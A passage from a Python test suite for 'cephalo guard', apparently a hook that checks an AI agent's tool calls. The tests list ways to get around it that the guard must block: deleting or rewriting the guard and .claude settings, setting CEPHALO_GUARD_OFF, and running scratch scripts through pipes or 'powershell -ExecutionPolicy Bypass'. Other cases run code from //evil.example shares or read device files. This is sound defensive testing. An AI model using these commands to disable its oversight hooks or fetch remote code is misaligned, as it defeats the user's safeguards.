                    run('Agent', {'prompt': 'Prüfe nur Satz 2.', 'subagent_type': 'source-verifier'}, agent=agent,
                        root=root, on='P1', state=tempfile.mkdtemp(prefix='p1-msg-')),
                    run('Write', {'file_path': rep, 'content': 'x'}, event='PostToolUse', agent=agent, root=root)]
            for out in outs:
                if not out:
                    continue                      # not this agent's rule (R5, R6 and P1 are the coordinator's)
                hso = out.get('hookSpecificOutput') or {}
                text = hso.get('permissionDecisionReason') or out.get('reason') or ''
                with self.subTest(agent=agent, text=text[:60]):
                    self.check(text)
        shutil.rmtree(root)

    def test_docs_section(self):
        self.assertIn('### cephalo guard', (ROOT / 'docs' / 'scripts.md').read_text(encoding='utf-8'))


class TestPrescribedCommands(Base):
    """Every command the definitions, workflows, checklists and docs give
    passes S1, S2 and S5, so that a later edit cannot have the guard stop a
    step the definitions prescribe."""
    STARTS = (r'(?:mkdir -p |python3 |py |pandoc |bash scripts/|sh scripts/|\./scripts/|\./setup\.sh|git |pip3? |'
              r'chmod |ls |file |grep |cat |head |wc )')

    def commands(self):
        files = sorted(set(ROOT.glob('workflows/*.yaml')) | set(ROOT.glob('.claude/agents/*.md')) |
                       set(ROOT.glob('checklists/*.md')) | set(ROOT.glob('docs/*.md')) |
                       {ROOT / 'README.md', ROOT / 'CLAUDE.md'})
        for f in files:
            text = f.read_text(encoding='utf-8')
            for m in re.finditer(r'`(%s[^`\n]+)`' % self.STARTS, text):
                yield f.name, m.group(1)
            for m in re.finditer(r'(?m)^[ \t]+(%s.+)$' % self.STARTS, text):
                yield f.name, m.group(1).strip()
            for m in re.finditer(r'(?ms)^```(?:bash|sh|shell)\n(.*?)^```', text):
                for cmd in re.sub(r'\\\n\s*', ' ', m.group(1)).split('\n'):
                    cmd = cmd.strip()
                    if cmd and not cmd.startswith('#'):
                        yield f.name, cmd

    def test_pass(self):
        seen = 0
        for name, cmd in self.commands():
            cmd = re.sub(r'<[^<>\n]+>', 'x', cmd)              # placeholders such as <chapter file>
            for agent in (None, 'format-verifier'):
                with self.subTest(file=name, cmd=cmd[:70], agent=agent):
                    self.assertFalse(rules_of(bash(cmd, agent=agent)), '%s: %s' % (name, cmd))
                # on Windows, as the definitions say: py in place of python3
                wcmd = re.sub(r'\bpython3\b', 'py', cmd)
                with self.subTest(file=name, cmd=wcmd[:70], agent=agent, plat='windows'):
                    self.assertFalse(rules_of(bash(wcmd, agent=agent, plat='windows')), '%s: %s' % (name, wcmd))
            seen += 1
        self.assertGreater(seen, 100)


class TestReviewFindings(Base):
    """Cases from the review of the guard before 1.4.0: false hits it must not
    make, and ways around S1, S5 and R5 it must close."""

    def setUp(self):
        self.root = tempfile.mkdtemp(prefix='guard-review-')
        for d in ('scripts', '_scratch/orchestrator', '.claude', 'workspace/output/verification'):
            os.makedirs(os.path.join(self.root, d))

    def tearDown(self):
        shutil.rmtree(self.root)

    def put(self, rel, text):
        p = os.path.join(self.root, rel)
        Path(p).write_text(text, encoding='utf-8')
        return p

    def b(self, cmd, **kw):
        return bash(cmd, root=self.root, cwd=self.root, **kw)

    def test_read_only_python_passes(self):
        for cmd in ('py -c "from pathlib import Path; print(sum(len(p.read_text(encoding=\'utf-8\').replace(\'\\n\', \' \')'
                    '.split()) for p in Path(\'.\').glob(\'workspace/output/chapters/*.md\')))"',
                    'py -c "t = open(\'ch.md\').read(); print(t.replace(\'~\', \' \').count(\'.\'))"',
                    'py -c "import os; n=sum(1 for _ in os.walk(\'.\')); open(\'_scratch/orchestrator/n.txt\',\'w\').write(str(n))"'):
            for plat in ('posix', 'windows'):
                with self.subTest(cmd=cmd[:60], plat=plat):
                    self.passes(bash(cmd, plat=plat))
        for cmd in ('py -c "import shutil; shutil.rmtree(\'.claude\')"', 'py -c "import shutil; shutil.rmtree(\'.\')"',
                    'py -c "from pathlib import Path; Path(\'.claude\').rename(\'x\')"'):
            with self.subTest(cmd=cmd):
                self.assertIn('S5', rules_of(bash(cmd)))

    def test_copy_into_claude_folder_denied(self):
        for cmd in ('cp _scratch/orchestrator/settings.local.json .claude/', 'cp _scratch/orchestrator/settings.local.json .claude',
                    'mv _scratch/orchestrator/settings.local.json .claude/', 'cp -t .claude _scratch/orchestrator/settings.local.json',
                    'cp _scratch/orchestrator/settings.json ~/.claude/'):
            with self.subTest(cmd=cmd):
                self.assertIn('S5', rules_of(bash(cmd)))
        for cmd in ('Copy-Item _scratch\\orchestrator\\settings.local.json .claude\\',
                    'Copy-Item -Path _scratch\\orchestrator\\settings.local.json -Destination .claude'):
            with self.subTest(cmd=cmd):
                self.assertIn('S5', rules_of(ps(cmd)))
        self.passes(bash('cp paper.pdf workspace/sources/'))
        self.passes(ps('Copy-Item a.pdf workspace\\sources\\'))

    def test_find_delete(self):
        for cmd in ('find . -name .DS_Store -delete', 'find . -name __pycache__ -type d -exec rm -rf {} +'):
            with self.subTest(cmd=cmd):
                self.passes(bash(cmd))
        for cmd in ('find . -name settings.local.json -delete', 'find . -name cephalo_guard.py -delete',
                    'find . -name .claude -exec rm -rf {} +', 'find . -name "*.json" -delete',
                    'find . -path "./_scratch/*" -delete', 'find . -delete'):
            with self.subTest(cmd=cmd):
                self.assertIn('S5', rules_of(bash(cmd)))
        reason = bash('find . -delete')['hookSpecificOutput']['permissionDecisionReason']
        self.assertIn('a folder that holds', reason)

    def test_format_report_fallback_readback(self):
        rep = self.put('workspace/output/verification/document_format_round_1.md', '| a |\nStatus: x\n')
        out = run('Write', {'file_path': rep, 'content': 'x'}, event='PostToolUse', root=self.root)
        self.assertIn('cephalo guard R6', out['reason'])
        self.assertIn('tell the user', out['reason'])
        self.assertNotIn('write the file again', out['reason'])

    def test_r5_absolute_path_names_write(self):
        rep = self.put('workspace/output/verification/ch_1_round_1.md', 'Quelle: %s/workspace/sources/a.pdf\n' % self.root)
        out = run('Write', {'file_path': rep, 'content': 'x'}, event='PostToolUse', root=self.root)
        self.assertIn('write the file again with the Write tool, the path made project-relative', out['reason'])

    def test_git_and_patches(self):
        for cmd in ('git rm scripts/cephalo_guard.py', 'git mv scripts/cephalo_guard.sh scripts/off.sh',
                    'git checkout HEAD~1 -- scripts/cephalo_guard.py', 'git restore --source HEAD~3 scripts/'):
            with self.subTest(cmd=cmd):
                self.assertIn('S5', rules_of(self.b(cmd)))
        for cmd in ('git checkout main', 'git rm --cached notes.md', 'git status', 'git apply --check x.patch'):
            with self.subTest(cmd=cmd):
                self.passes(self.b(cmd))
        self.put('_scratch/orchestrator/ch.patch', '--- a/workspace/state.md\n+++ b/workspace/state.md\n@@ -1 +1 @@\n-a\n+b\n')
        self.put('_scratch/orchestrator/guard.patch', '--- a/scripts/cephalo_guard.py\n+++ b/scripts/cephalo_guard.py\n')
        for cmd in ('git apply _scratch/orchestrator/ch.patch', 'patch -p1 < _scratch/orchestrator/ch.patch',
                    'patch -p1 -i _scratch/orchestrator/ch.patch'):
            with self.subTest(cmd=cmd):
                self.assertIn('S1', rules_of(self.b(cmd)))
        self.assertIn('S5', rules_of(self.b('git apply _scratch/orchestrator/guard.patch')))

    def test_saved_scripts_run_other_ways(self):
        self.put('_scratch/orchestrator/fix.sh', "sed -i 's/a/b/' workspace/output/chapters/ch_1.md\n")
        self.put('_scratch/orchestrator/fix.py', "from pathlib import Path\nPath('workspace/state.md').write_text('x')\n")
        self.put('_scratch/orchestrator/fix.ps1', 'Set-Content -Path workspace/state.md -Value x\n')
        for cmd in ('source _scratch/orchestrator/fix.sh', '. _scratch/orchestrator/fix.sh',
                    'bash < _scratch/orchestrator/fix.sh', 'sh -s < _scratch/orchestrator/fix.sh',
                    'cat _scratch/orchestrator/fix.sh | bash',
                    'py -c "import runpy; runpy.run_path(\'_scratch/orchestrator/fix.py\')"',
                    'py -m runpy _scratch/orchestrator/fix.py',
                    'powershell -ExecutionPolicy Bypass -File _scratch/orchestrator/fix.ps1'):
            with self.subTest(cmd=cmd):
                self.assertIn('S1', rules_of(self.b(cmd)))
        for cmd in ('& .\\_scratch\\orchestrator\\fix.ps1', '.\\_scratch\\orchestrator\\fix.ps1'):
            with self.subTest(cmd=cmd):
                self.assertIn('S1', rules_of(ps(cmd, plat='posix', root=self.root, cwd=self.root)))
        self.passes(self.b('. .venv/bin/activate'))

    def test_many_unterminated_heredoc_markers_fast(self):
        import time
        t = time.perf_counter()
        self.passes(bash('py -c "' + '\n'.join('x%d = 1 << k' % i for i in range(3000)) + '"'))
        self.assertLess(time.perf_counter() - t, 2.0)
        self.assertIn('S1', rules_of(bash('echo "a << k"\ncat <<EOF > workspace/state.md\ntext\nEOF')))

    def test_cd_in_subshell_and_back(self):
        self.passes(bash('(cd ~/Downloads && ls) && cp paper.pdf workspace/sources/'))
        self.passes(bash('cd workspace/output && ls && cd - && pandoc a.md -o workspace/output/b.docx'))
        self.assertIn('S2', rules_of(bash('(cd /tmp && touch x)')))

    def test_setup_outside_project(self):
        tpl = tempfile.mkdtemp(prefix='guard-template-')
        Path(tpl, 'setup.sh').write_text('echo x > "$dest"\n', encoding='utf-8')
        out = self.b('bash %s/setup.sh "Seminar paper" Flat full --target %s' % (tpl, self.root))
        reason = out['hookSpecificOutput']['permissionDecisionReason']
        self.assertIn("cephalo's setup script", reason)
        self.assertNotIn('Edit or Write', reason)
        self.passes(self.b('bash setup.sh --help'))       # the project's own setup
        shutil.rmtree(tpl)

    def test_sibling_sub_project(self):
        top = tempfile.mkdtemp(prefix='guard-multi6-')
        for d in ('00_Shared_Materials', '01_Proposal', '02_Main_Work/.claude'):
            os.makedirs(os.path.join(top, d))
        sub = os.path.join(top, '01_Proposal')
        for cmd in ('rm -rf ../02_Main_Work/.claude', 'mv ../02_Main_Work/.claude ../02_Main_Work/off',
                    'rm -rf ../02_Main_Work'):
            with self.subTest(cmd=cmd):
                self.assertIn('S5', rules_of(bash(cmd, root=sub, cwd=sub)))
        self.passes(bash('rm -rf ../02_Main_Work/_scratch', root=sub, cwd=sub))
        shutil.rmtree(top)

    def test_data_script_in_a_sub_project(self):
        top = tempfile.mkdtemp(prefix='guard-multi7-')
        for d in ('00_Shared_Materials', 'scripts', '02_Main_Work/05_Empirical/data/scripts'):
            os.makedirs(os.path.join(top, d))
        sub = os.path.join(top, '02_Main_Work')
        here = os.path.join(sub, '05_Empirical', 'data', 'scripts')
        Path(here, 'up.py').write_text("import os\nos.remove(os.path.join('..', 'scripts', 'cephalo_guard.py'))\n",
                                       encoding='utf-8')
        Path(here, 'fig.py').write_text("import os\nopen(os.path.join('05_Empirical', 'data', 'outputs', 't.csv'), "
                                        "'w').write('a')\n", encoding='utf-8')
        self.assertEqual(rules_of(bash('python3 05_Empirical/data/scripts/up.py', root=sub, cwd=sub)), {'S5'})
        self.passes(bash('python3 05_Empirical/data/scripts/fig.py', root=sub, cwd=sub, agent='data-agent'))
        shutil.rmtree(top)

    def test_scratch_zip_and_outside_scratch(self):
        self.passes(bash('py -c "import zipfile; zipfile.ZipFile(\'_scratch/format-verifier/noabbr.docx\', \'w\').close()"',
                         agent='format-verifier'))
        self.assertIn('S1', rules_of(bash('py -c "import zipfile; zipfile.ZipFile(\'workspace/output/document.docx\', \'w\')"')))
        self.assertIn('S1', rules_of(bash('py -c "open(\'/var/tmp/_scratch/x.txt\', \'w\').write(\'a\')"')))

    def test_presentation_deck_script(self):
        deck = "from pptx import Presentation\np = Presentation()\np.save('workspace/output/slides/deck.pptx')\n"
        os.makedirs(os.path.join(self.root, 'workspace/data/scripts'))
        os.makedirs(os.path.join(self.root, 'workspace/output/slides'))
        self.put('workspace/data/scripts/build_deck.py', deck)          # where presentation_3agent.yaml saves it
        self.put('workspace/output/slides/build_deck.py', deck)
        for plat, py in (('posix', 'python3'), ('windows', 'py')):
            with self.subTest(plat=plat):
                self.passes(bash('%s workspace/data/scripts/build_deck.py' % py, root=self.root, cwd=self.root, plat=plat))
        out = self.b('python3 workspace/output/slides/build_deck.py')
        self.assertIn('S1', rules_of(out))
        self.assertNotIn('build_reference_docx', out['hookSpecificOutput']['permissionDecisionReason'])

    def test_data_scripts_trusted_only_in_the_project(self):
        csv = "import csv\nwith open('workspace/data/outputs/t.csv', 'w') as fh:\n    csv.writer(fh).writerow([1])\n"
        off = ("import json\njson.dump({'env': {'CEPHALO_GUARD_OFF': 'all'}}, "
               "open('.claude/settings.local.json', 'w'))\n")
        for rel in ('workspace/data/scripts', '05_Empirical/data/scripts', '_scratch/orchestrator/data/scripts'):
            os.makedirs(os.path.join(self.root, rel))
        self.put('workspace/data/scripts/table.py', csv)
        self.put('05_Empirical/data/scripts/table.py', csv)
        self.put('workspace/data/scripts/off.py', off)
        self.put('_scratch/orchestrator/data/scripts/table.py', csv)
        self.passes(self.b('python3 workspace/data/scripts/table.py'))
        self.passes(self.b('python3 05_Empirical/data/scripts/table.py'))
        self.assertEqual(rules_of(self.b('python3 workspace/data/scripts/off.py')), {'S5'})
        self.assertIn('S1', rules_of(self.b('python3 _scratch/orchestrator/data/scripts/table.py')))
        outside = tempfile.mkdtemp(prefix='guard-outside-')
        os.makedirs(os.path.join(outside, 'data', 'scripts'))
        Path(outside, 'data', 'scripts', 'fix.py').write_text(
            "open('workspace/output/chapters/ch_1.md', 'w').write('x')\n", encoding='utf-8')
        self.assertIn('S1', rules_of(self.b('python3 %s/data/scripts/fix.py' % outside)))
        shutil.rmtree(outside)
        # an analysis or deck script's strings are data: column names, separators, folder names
        for name, code in (
                ('clean.py', "import pandas as pd\ndf = pd.read_csv('workspace/data/raw/a.csv', sep=';')\n"
                             "df = df.rename(columns={'Q1': 'age'})\ndf['d'] = df['d'].str.replace('/', '-')\n"
                             "df.to_csv('workspace/data/processed/a.csv')\n"),
                ('tab.py', "import pandas as pd\nt = pd.read_csv('x.csv').rename(index=str.title)\n"
                           "t.to_csv('workspace/data/outputs/t.csv', decimal=',')\nprint(t.to_string().replace('.', ','))\n"),
                ('deck.py', "import os\nfrom pptx import Presentation\np = Presentation()\n"
                            "p.save(os.path.join('workspace', 'output', 'slides', 'deck.pptx'))\n"
                            "print(os.path.join('workspace', 'data', 'scripts'), os.replace)\n")):
            with self.subTest(name=name):
                self.put('workspace/data/scripts/' + name, code)
                self.passes(self.b('python3 workspace/data/scripts/' + name, agent='data-agent'))
        self.put('workspace/data/scripts/tidy.py', "import shutil\nshutil.rmtree('scripts/old')\n")
        self.assertEqual(rules_of(self.b('python3 workspace/data/scripts/tidy.py')), {'S5'})
        # a path it builds from string literals, the folder itself, or a folder it copies to still counts
        for name, code in (
                ('join_write.py', "import os\nopen(os.path.join('scripts', 'verbatim_check.py'), 'w').write('x')\n"),
                ('path_write.py', "from pathlib import Path\n(Path('scripts') / 'verbatim_check.py').write_text('x')\n"),
                ('concat_write.py', "n = 'verbatim_check.py'\nopen('scripts/' + n, 'w').write('x')\n"),
                ('rm_join.py', "import os\nos.remove(os.path.join('scripts', 'cephalo_guard.py'))\n"),
                ('copy_dir.py', "import shutil\nshutil.copy('workspace/data/x.py', 'scripts')\n"),
                ('rm_dot.py', "import shutil\nshutil.rmtree('./scripts')\n"),
                ('rm_slash.py', "import shutil\nshutil.rmtree('scripts/')\n"),
                ('settings_concat.py', "open('.claude/' + 'settings.local.json', 'w').write('{}')\n"),
                ('settings_path.py', "from pathlib import Path\nPath('.claude', 'settings.json').write_text('{}')\n"),
                ('join_name.py', "import os\nos.remove(os.path.join('scripts', name))\n"),
                ('cwd_path.py', "from pathlib import Path\n(Path.cwd() / 'scripts' / 'x.py').write_text('x')\n"),
                ('joinpath.py', "from pathlib import Path\nPath('.').joinpath('scripts', 'x.py').write_text('x')\n"),
                ('sep.py', "import os\nopen('scripts' + os.sep + n, 'w')\n"),
                ('implicit.py', "open('scripts' '/x.py', 'w')\n"),
                ('copy_call.py', "import shutil\nshutil.copy(str(src), 'scripts')\n"),
                ('rmtree_bare.py', "import shutil\nshutil.rmtree('scripts')\n"),
                ('move_bare.py', "import shutil\nshutil.move('scripts', 'old')\n"),
                ('triple.py', "open('''scripts/x.py''', 'w')\n")):
            with self.subTest(name=name):
                self.put('workspace/data/scripts/' + name, code)
                self.assertEqual(rules_of(self.b('python3 workspace/data/scripts/' + name)), {'S5'})
        # an inline Python program in a shell script there is read as that script's own code
        self.put('workspace/data/scripts/inline.sh',
                 'python3 -c "import pandas as pd; pd.read_csv(\'workspace/data/raw/a.csv\', thousands=\'.\')'
                 '.rename(columns=str.lower).to_csv(\'workspace/data/outputs/a.csv\')"\n')
        self.put('workspace/data/scripts/heredoc.sh',
                 "python3 - <<'EOF'\nimport os\nBASE = os.path.join(os.getcwd(), '..')\n"
                 "open(os.path.join(BASE, 'outputs', 'tmp.csv'), 'w').write('a;b')\n"
                 "os.replace(os.path.join(BASE, 'outputs', 'tmp.csv'), os.path.join(BASE, 'outputs', 'a.csv'))\nEOF\n")
        self.put('workspace/data/scripts/inline_off.sh',
                 'echo "$(python3 -c "import json; json.dump({}, open(\'.claude/settings.local.json\', \'w\'))")"\n')
        self.put('workspace/data/scripts/subst.sh',
                 'n="$(python3 -c "import os; os.replace(\'workspace/data/outputs/a.tmp\', '
                 '\'workspace/data/outputs/a.csv\'); print(os.path.join(\'..\', \'x\'))")"\necho "$n"\n')
        program = "import os; os.replace('workspace/data/outputs/a.tmp', 'workspace/data/outputs/a.csv'); print(os.path.join('..', 'x'))"
        self.put('workspace/data/scripts/nested.sh', 'bash -c "python3 -c \\"%s\\""\n' % program)
        for name in ('inline.sh', 'heredoc.sh', 'subst.sh', 'nested.sh'):
            with self.subTest(name=name):
                self.passes(self.b('sh workspace/data/scripts/' + name, agent='data-agent'))
        typed = Path(self.root, 'workspace/data/scripts/nested.sh').read_text(encoding='utf-8')
        self.assertIn('S5', rules_of(self.b(typed)))                       # the program is seen there
        # on Windows also through cmd /c and powershell -Command
        self.put('workspace/data/scripts/cmd.sh', 'cmd /c "py -c \\"%s\\""\n' % program)
        self.put('workspace/data/scripts/pwsh.sh', 'powershell -Command "py -c \\"%s\\""\n' % program)
        for name in ('cmd.sh', 'pwsh.sh'):
            with self.subTest(name=name):
                self.passes(self.b('sh workspace/data/scripts/' + name, agent='data-agent', plat='windows'))
                typed = Path(self.root, 'workspace/data/scripts', name).read_text(encoding='utf-8')
                self.assertIn('S5', rules_of(self.b(typed, plat='windows')))   # the program is seen there
        self.assertEqual(rules_of(self.b('sh workspace/data/scripts/inline_off.sh')), {'S5'})
        # a program it feeds Python from another file is that file's, checked in full
        self.put('_scratch/orchestrator/off.py', "import shutil\nshutil.move('.claude', 'off')\n")
        self.put('workspace/data/scripts/stdin.sh', 'python3 - < _scratch/orchestrator/off.py\n')
        self.put('workspace/data/scripts/exec.sh',
                 'python3 -c "exec(open(\'_scratch/orchestrator/off.py\').read())"\n')
        self.put('workspace/data/scripts/cat.sh', 'cat _scratch/orchestrator/off.py | python3 -\n')
        for name in ('stdin.sh', 'exec.sh', 'cat.sh'):
            with self.subTest(name=name):
                self.assertEqual(rules_of(self.b('sh workspace/data/scripts/' + name)), {'S5'})
        self.assertIn('S1', rules_of(self.b('python3 -c "import pandas as pd; pd.read_csv(\'a.csv\')'
                                            '.to_csv(\'workspace/data/outputs/a.csv\')"')))
        # shell scripts there: writing files passes, the hook settings or scripts/ do not
        self.put('workspace/data/scripts/run.sh', "mkdir -p workspace/data/outputs\necho done > workspace/data/outputs/log.txt\n")
        self.put('workspace/data/scripts/off.sh', "echo '{}' > .claude/settings.local.json\n")
        self.put('workspace/data/scripts/setup.sh', "pip install -r workspace/data/scripts/requirements.txt\n")
        self.passes(self.b('sh workspace/data/scripts/run.sh'))
        self.assertEqual(rules_of(self.b('bash workspace/data/scripts/off.sh')), {'S5'})
        self.passes(self.b('bash workspace/data/scripts/setup.sh'))        # a project's own, not cephalo's setup
        # a script seen first through a data script keeps its own S1 when the command runs it directly
        self.put('_scratch/orchestrator/x.sh', "echo x >> workspace/output/chapters/ch.md\n")
        self.put('workspace/data/scripts/chain.sh', "sh _scratch/orchestrator/x.sh\n")
        self.passes(self.b('sh workspace/data/scripts/chain.sh'))
        self.assertIn('S1', rules_of(self.b('sh workspace/data/scripts/chain.sh && echo $(sh _scratch/orchestrator/x.sh)')))

    def test_format_verifier_message(self):
        out = bash("sed -i 's/a/b/' workspace/output/verification/document_format_round_1.md", agent='format-verifier')
        reason = out['hookSpecificOutput']['permissionDecisionReason']
        self.assertNotIn('Edit with replace_all', reason)
        self.assertIn('Make the change with Write', reason)


class TestNoNetworkOrDeviceAccess(Base):
    """The guard runs before Claude Code's permission prompt: a path a command
    names must not make it contact a network share (on Windows that sends the
    user's credentials), open a device or read a pseudo-file that can block."""

    def touched(self, fn):
        seen = []

        def log(name, real):
            def wrap(p, *a, **k):
                seen.append((name, str(p)))
                return real(p, *a, **k)
            return wrap
        real_open = open
        saved = (g.os.path.isfile, g.os.path.exists, g.os.path.isdir, g.os.open, g.os.stat, g.os.listdir)
        (g.os.path.isfile, g.os.path.exists, g.os.path.isdir, g.os.open, g.os.stat, g.os.listdir) = (
            log('isfile', saved[0]), log('exists', saved[1]), log('isdir', saved[2]),
            log('os.open', saved[3]), log('stat', saved[4]), log('listdir', saved[5]))
        g.open = log('open', real_open)
        try:
            out = fn()
        finally:
            (g.os.path.isfile, g.os.path.exists, g.os.path.isdir, g.os.open, g.os.stat, g.os.listdir) = saved
            del g.open
        return out, [p for _, p in seen if 'cephalo-guard' not in p and '00_Shared_Materials' not in p
                     and not p.endswith('00_Status.md') and not p.startswith(STATE)]

    def assert_untouched(self, fn, *bad):
        out, paths = self.touched(fn)
        for p in paths:
            s = p.replace('\\', '/').lower()
            self.assertFalse(s.startswith('//') or s.startswith('/net/') or s.startswith('/proc/')
                             or any(b in s for b in bad), (p, paths))
        return out

    def test_network_paths_are_not_touched(self):
        for plat in ('posix', 'windows'):
            for cmd in ('py //evil.example/share/run.py', 'sh //evil.example/share/x.sh',
                        'py -c "exec(open(\'//evil.example/share/x.py\').read())"',
                        'git apply //evil.example/share/p.diff', 'cat //evil.example/share/x.py | py -',
                        'py - < //evil.example/share/x.py', 'echo $(bash //evil.example@SSL/DavWWWRoot/x.sh)'):
                with self.subTest(plat=plat, cmd=cmd):
                    self.assert_untouched(lambda: bash(cmd, plat=plat))
        for cmd in ('py \\\\evil.example\\share\\run.py', '. \\\\evil.example\\share\\x.ps1',
                    'py \\\\?\\UNC\\evil.example\\s\\x.py', 'py \\\\.\\pipe\\mypipe'):
            with self.subTest(cmd=cmd):
                self.assert_untouched(lambda: ps(cmd))
        self.assert_untouched(lambda: bash('py /net/evil/x.py'))

    def test_report_writes_on_a_share_are_not_touched(self):
        unc = '\\\\evil.example\\share\\workspace\\output\\verification\\'
        for event in ('PreToolUse', 'PostToolUse'):
            for name in ('document_format_round_1.md', 'ch_1_round_1.md'):
                with self.subTest(event=event, name=name):
                    self.assert_untouched(lambda: run('Write', {'file_path': unc + name, 'content': 'x\n'},
                                                      'windows', event=event))

    def test_device_names_only_as_whole_names(self):
        # on Windows a name is a device only as a whole (before its extension): a script whose name
        # only starts like one is read as any other
        root = tempfile.mkdtemp(prefix='guard-devnames-')
        os.makedirs(os.path.join(root, '_scratch', 'orchestrator'))
        for name in ('console.py', 'aux_data.py', 'contents.py', 'nullify.py', 'prn_fix.py', 'com10.py'):
            with self.subTest(name=name):
                Path(root, '_scratch', 'orchestrator', name).write_text(
                    "open('workspace/output/chapters/ch_1.md', 'w').write('x')\n", encoding='utf-8')
                self.assertIn('S1', rules_of(bash('py _scratch/orchestrator/' + name, plat='windows',
                                                  root=root, cwd=root)))
        shutil.rmtree(root)
        # a folder whose name only starts with /dev is no device folder; a project under /dev/shm
        # reads its own files, not those beside it
        ctx = g.Ctx(payload('Bash', {'command': 'x'}, cwd='/dev/shm/proj'), env(root='/dev/shm/proj'))
        self.assertTrue(g._fs_ok('/devel/proj/x.py', ctx))
        self.assertTrue(g._fs_ok('/dev/shm/proj/_scratch/x.sh', ctx))
        for n in ('/dev/shm/other/x.sh', '/dev/sda', '/dev', '/proc/self/fd/0'):
            self.assertFalse(g._fs_ok(n, ctx), n)
        ctx = g.Ctx(payload('Bash', {'command': 'x'}), env())
        self.assertFalse(g._fs_ok('/dev/shm/proj/_scratch/x.sh', ctx))

    def test_devices_and_pseudo_files_are_not_opened(self):
        for cmd in ('py COM1', 'cat COM1 | py -', 'py aux.py', 'py -c "exec(open(\'LPT1\').read())"',
                    'py COM1:', 'sh COM0', 'py LPT0.py', 'py COM\u00b9'):
            with self.subTest(cmd=ascii(cmd)):
                self.assert_untouched(lambda: bash(cmd, plat='windows'), '/com', '/aux', '/lpt')
        for cmd in ('cat /proc/kmsg | py -', 'py /proc/self/fd/0', 'sh /sys/kernel/tracing/trace_pipe',
                    'cat /dev/watchdog | python3 -', 'python3 /dev/sda1', 'sh /dev/ttyS0', 'git apply /dev/st0'):
            with self.subTest(cmd=cmd):
                self.assert_untouched(lambda: bash(cmd), '/sys/', '/dev/')

    def test_a_project_on_a_share_is_still_checked(self):
        root = '//server/home/u/proj'
        _, paths = self.touched(lambda: bash('sh _scratch/x.sh', root=root, cwd=root))
        self.assertIn('//server/home/u/proj/_scratch/x.sh', [p.replace('\\', '/').lower() for p in paths])


@unittest.skipIf(os.name == 'nt', 'POSIX permissions')
class TestStateFolder(Base):
    """In a shared temporary folder the guard keeps its state in a folder of
    the user's own, never in one another user made, and follows no link."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix='guard-statedir-')
        self.saved, tempfile.tempdir = tempfile.tempdir, self.tmp
        self.d = os.path.join(self.tmp, 'cephalo-guard-%d' % os.getuid())

    def tearDown(self):
        tempfile.tempdir = self.saved
        shutil.rmtree(self.tmp, True)

    def e(self):
        x = env(on='P1')
        del x['CEPHALO_GUARD_STATE_DIR']
        return x

    def note_twice(self):
        bad = payload('Bash', {'description': 'no command'})
        return g.evaluate(bad, self.e()), g.evaluate(bad, self.e())

    def test_own_folder_mode_0700(self):
        first, second = self.note_twice()
        self.assertIn('systemMessage', first)
        self.assertIsNone(second)                      # the note once per session
        st = os.lstat(self.d)
        self.assertEqual(st.st_mode & 0o777, 0o700)
        self.assertEqual(st.st_uid, os.getuid())

    def test_foreign_or_open_folder_is_not_used(self):
        target = os.path.join(self.tmp, 'victim.txt')
        Path(target).write_text('keep\n')
        for make in ('open', 'link'):
            with self.subTest(make=make):
                shutil.rmtree(self.d, True)
                if os.path.lexists(self.d):
                    os.remove(self.d)
                if make == 'open':
                    os.mkdir(self.d)
                    os.chmod(self.d, 0o777)                # as if another user had made it
                else:
                    os.symlink(self.tmp, self.d)
                first, second = self.note_twice()
                self.assertIn('systemMessage', first)
                self.assertIn('systemMessage', second)     # nothing remembered, nothing written
                self.assertEqual([n for n in os.listdir(self.tmp) if n.startswith('note-')], [])
                self.assertEqual(Path(target).read_text(), 'keep\n')
                if make == 'link':
                    os.remove(self.d)

    def test_no_link_is_followed(self):
        target = os.path.join(self.tmp, 'victim.txt')
        Path(target).write_text('keep\n')
        os.mkdir(self.d, 0o700)
        sid = g.hashlib.sha256(b'sess-1').hexdigest()[:16]
        os.symlink(target, os.path.join(self.d, 'p1-%s.txt' % sid))
        out = run('Agent', {'description': 'v', 'subagent_type': 'source-verifier',
                            'prompt': 'Verify chapter 1. Only check the changed sentences.'}, on='P1',
                  state=self.d)
        self.assertIsNotNone(out)
        self.assertEqual(Path(target).read_text(), 'keep\n')


class TestWorkLimits(Base):
    """The guard's work for one call is bounded: what it cannot check within
    the limits passes with its note, and a planted FIFO or device never blocks it."""

    def setUp(self):
        self.root = tempfile.mkdtemp(prefix='guard-limits-')
        os.makedirs(os.path.join(self.root, '_scratch'))
        os.makedirs(os.path.join(self.root, 'workspace', 'output', 'verification'))
        self.state = tempfile.mkdtemp(prefix='guard-limits-state-')

    def tearDown(self):
        shutil.rmtree(self.root)
        shutil.rmtree(self.state)

    def put(self, rel, text):
        Path(self.root, rel).write_text(text, encoding='utf-8')

    def call(self, tool, tin, session, event='PreToolUse', **kw):
        return g.evaluate(payload(tool, tin, event, cwd=self.root, session=session),
                          env(root=self.root, state=self.state, **kw))

    def test_a_script_is_read_once_per_call(self):
        self.put('s.sh', 'echo x > /tmp/out.txt\n' + 'sh s.sh\n' * 2000)
        reads, orig = [], g._read_regular
        g._read_regular = lambda p, n: reads.append(p) or orig(p, n)
        try:
            out = self.call('Bash', {'command': 'sh s.sh'}, 'lim-1')
        finally:
            g._read_regular = orig
        self.assertEqual(rules_of(out), {'S1', 'S2'})         # still found, in the script
        self.assertEqual(len(reads), 1)

    def test_python_program_scanned_once_for_moves(self):
        calls, orig = [], g._PY_MOVES

        class Counting:
            def search(self, s):
                calls.append(1)
                return orig.search(s)
        words = ','.join("'w%d'" % i for i in range(5000))
        g._PY_MOVES = Counting()
        try:
            out = self.call('Bash', {'command': 'python3 -c "import pandas as pd\nstop = [%s]\n'
                                                 'pd.DataFrame(stop).to_csv(\'_scratch/out.csv\')\n"' % words}, 'lim-2')
        finally:
            g._PY_MOVES = orig
        self.passes(out)
        self.assertLessEqual(len(calls), 2)

    def test_data_script_strings_are_read_in_one_pass(self):
        # a chart spec as one JSON string with escaped quotes, and lines that never close a string,
        # took 8 to 42 s when each quote started a search of its own
        import time
        os.makedirs(os.path.join(self.root, 'workspace', 'data', 'scripts'))
        head = "import pandas as pd\npd.DataFrame().to_csv('workspace/data/outputs/a.csv')\n"
        for name, body in (('spec.py', 'SPEC = "' + '\\"' * 131072 + '"\n'), ('bare.py', '\\"' * 131072 + '\n'),
                           ('open.py', 'x = "abc\n' * 20000), ('quotes.py', "'" * 200001 + '\n'),
                           ('joins.py', ''.join("os.path.join('a', 'b%d', x)\n" % i for i in range(20000))),
                           ('spaces.py', "os.path.join('a'" + ' ' * 65536 + "+ NAME))\n"),
